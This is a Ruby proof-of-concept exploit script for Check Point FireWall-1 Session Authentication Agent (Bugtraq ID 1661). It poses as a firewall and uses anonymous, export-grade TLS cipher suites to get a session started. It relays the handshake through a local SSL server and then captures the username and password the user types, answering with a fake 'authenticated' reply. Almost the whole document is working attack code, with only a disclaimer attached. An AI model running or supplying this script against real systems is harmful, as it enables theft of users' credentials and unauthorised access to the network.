#!/usr/bin/env ruby

#
# PoC for classic bug (Bugtraq ID 1661) in Check Point Session Authentication
# Agent - this time, however, credentials can be stolen even when Session
# Authentication Agent doesn't allow for clear-text communication.
#
# Document RFC2246 describes weaknesses of cipher suites used in this product.
#
# Attacker's host still needs to be defined as "Allowed FireWall-1" on Session
# Authentication Agent side.
#
# PoC has been tested with the following products: 
# * FireWall-1 Authentication Agent NG (v5.0?) 
# * SecurePlatform R75 gateway
#
# Use at your own risk. I hold no responsibility for use or misuse of this
# code.
#
# by <jozwiack@gmail.com>
#

require 'socket'
require 'openssl'
require 'ipaddr'
require 'optparse'

# Command line options
options = {}
optparse = OptionParser.new do |opts|

  opts.banner = "Usage #{opts.program_name}.rb [options] TARGET"
  opts.set_summary_width(52)

  options[:sslport] = 10443
  opts.on(
    '-p',
    '--port SSLPORT',
    'Define the port on which SSL server will run (default: localhost:10443)'
  ) do |o|
    options[:sslport] = o
  end

  options[:connection] = false
  opts.on(
    '-c',
    '--connection srcip,srcport,dstip,dstport,proto',
    Array,
    'Present user with details of connection for which auth is pending'
  ) do |o|
    options[:connection] = o
  end

  options[:fwname] = "FW-1"
  opts.on(
    '-f',
    '--fwname NAME',
    'Define the name of firewall presented to user (default: FW-1)'
  ) do |o|
    options[:fwname] = o
  end

  opts.on('-h', '--help', 'Display help') do
    print opts
    exit
  end
end

# Parse options, leave TARGET in ARGV[0]
optparse.parse!
if !ARGV[0]
  print "[-] Please define target host.\n"
  print optparse
  exit
end

# Pass data between sockets
def clone(src,dst)
  buf = src.recv(1024)
  dst.write(buf)
  return buf.size
end

# Print collected credentials
def cred(u,p)
  print "[+] Username: #{u}\n[+] Password: #{p}\n" if u
end

@username = nil
@password = nil

# Prepare connection array. Transform dotted decimal IPs to long
if options[:connection]
  if options[:connection].size == 5
    # Src IP to Long
    options[:connection][0] = IPAddr.new(options[:connection][0]).to_i
    # Dst IP to Long
    options[:connection][2] = IPAddr.new(options[:connection][2]).to_i
  else
    print "[-] Something's wrong with '-c' option.\n"
    exit
  end
end

# Initialize SSL server, run on localhost
begin
  server  = TCPServer.new("127.0.0.1",options[:sslport])
rescue Errno::EADDRINUSE
  print "[-] Not able to bind SSL server, try to use different port.\n"
  exit
rescue Exception => e
  print "[-] Exception: #{e}\n"
  exit
end

sslcontext = OpenSSL::SSL::SSLContext.new
sslserver = OpenSSL::SSL::SSLServer.new(server, sslcontext)

# Define cipher suites for SSL server
# Below are cipher suites supported by Session Authentication Agent
sslcontext.ciphers = [
  # TLS_DH_anon_EXPORT_WITH_RC4_40_MD5
  ["EXP-ADH-RC4-MD5", "TLSv1/SSLv3", 40, 128],
  # TLS_DH_anon_WITH_RC4_128_MD5
  ["ADH-RC4-MD5", "TLSv1/SSLv3", 128, 128],
  # TLS_DH_anon_EXPORT_WITH_DES40_CBC_SHA
  ["EXP-ADH-DES-CBC-SHA", "TLSv1/SSLv3", 40 , 128],
  # TLS_DH_anon_WITH_DES_CBC_SHA
  ["ADH-DES-CBC-SHA", "TLSv1/SSLv3", 56 , 56],
  # TLS_DH_anon_WITH_3DES_EDE_CBC_SHA
  ["ADH-DES-CBC3-SHA", "TLSv1/SSLv3", 168, 168]
]

# Initialize socket for connection to Session Authentication Agent
# Session Authentication Agent always runs on TCP/261
begin
  sock_sagnt = TCPSocket.new(ARGV[0], 261)
rescue Errno::EHOSTUNREACH
  print "[-] Session Agent host is not reachable.\n"
  exit
rescue Errno::ETIMEDOUT
  print "[-] Connection to Session Agent service timed out.\n"
  exit
rescue Exception => e
  print "[-] Exception: #{e}\n"
  exit
end

# Initialize socket for connection to SSL server
sock_server = TCPSocket.new("127.0.0.1", options[:sslport])

# Run SSL server thread
Thread.new {
  begin
    sslconn = sslserver.accept
    sslconn.syswrite(
      "220 FW-1 Session Authentication Request from #{options[:fwname]}\n"
    )
    sslconn.syswrite(
      "211 #{options[:connection][0]} #{options[:connection][1]} " +
      "#{options[:connection][2]} #{options[:connection][3]} " +
      "#{options[:connection][4]}\n"
    ) if options[:connection]
    sslconn.syswrite("331 User:\n")
    @username = sslconn.sysread(1024).chop!
    sslconn.syswrite("331 *Password:\n")
    @password = sslconn.sysread(1024).chop!
    sslconn.syswrite(
      "200 User #{@username} authenticated by FireWall-1 authentication.\n" +
      "230 OK.\n"
    )
  sslconn.close
  rescue EOFError
    cred(@username,@password)
    print "[S] EOFError - User clicked 'Cancel'?\n"
    exit
  rescue Exception => e
    cred(@username,@password)
    print "[S] Exception: #{e}\n"
    exit
  end
}

begin
  # Initiate SSL-based auth
  sock_sagnt.write(
    "220 FW-1 Session Authentication Request from #{options[:fwname]}\n"
  )
  sock_sagnt.write("201 131072\n")
  sock_sagnt.write(
    "211 #{options[:connection][0]} #{options[:connection][1]} " +
    "#{options[:connection][2]} #{options[:connection][3]} " +
    "#{options[:connection][4]}\n"
  ) if options[:connection]
  sock_sagnt.write("331 User:\n")

  # Check for Session agent error message
  buf = sock_sagnt.recv(1024)
  if buf =~ /431/
    print "[-] Session Agent error - probably older version. " +
      "Try clear text credential stealing\n"
    exit
  end
  print "[+] Session Agent supports SSL\n"

  sock_sagnt.write("202 \n")
  print "[+] SSL/TLS Exchange will follow\n"

  size = clone(sock_sagnt,sock_server)
  print "[+]_ #{size} bytes: Session Agent >>> Server\n" +
    "    \\_ SSL Client Hello\n"

  size = clone(sock_server,sock_sagnt)
  print "[+]_ #{size} bytes: Server >>> Session Agent\n" +
    "    \\_ TLSv1 Server Hello, Server Key Exchange, Server Hello Done\n"

  size = clone(sock_sagnt,sock_server)
  print "[+]_ #{size} bytes: Session Agent >>> Server\n    " +
    "\\_ TLSv1 Client Key Exchange, Change Cipher Spec, Encrypted Handshake\n"

  size = clone(sock_server,sock_sagnt)
  print "[+]_ #{size} bytes: Server >>> Session Agent\n    " +
    "\\_ TLSv1 Change Cipher Spec, Encrypted Handshake\n"

  # SSL/TLS handshake ends, send application data. Server will start
  size = clone(sock_server,sock_sagnt)
  print "[+]_ #{size} bytes: Server >>> Session Agent\n" +
    "    \\_ Session Authentication: 220 + 211 + 331 User\n"

  size = clone(sock_sagnt,sock_server)
  print "[+]_ #{size} bytes: Session Agent >>> Server\n" +
    "    \\_ Session Authentication: username\n"

  size = clone(sock_server,sock_sagnt)
  print "[+]_ #{size} bytes: Server >>> Session Agent\n" +
    "    \\_ Session Authentication: 331 Password message\n"

  size = clone(sock_sagnt,sock_server)
  print "[+]_ #{size} bytes: Session Agent >>> Server\n" +
    "    \\_ Session Authentication: password\n"

  # Send confirmation to Session Agent that authentication is successful
  size = clone(sock_server,sock_sagnt)
  print "[+]_ #{size} bytes: Server >>> Session Agent\n" +
    "    \\_ Session Authentication: 200 + 230 message\n"

rescue Errno::ECONNRESET => e
  print "[-] Connection reset by peer. Error: #{e}\n"
  exit
rescue Errno::EPIPE => e
  print "[-] Broken pipe. Error: #{e}\n"
  exit
end

cred(@username,@password)

sock_sagnt.close
sock_server.close
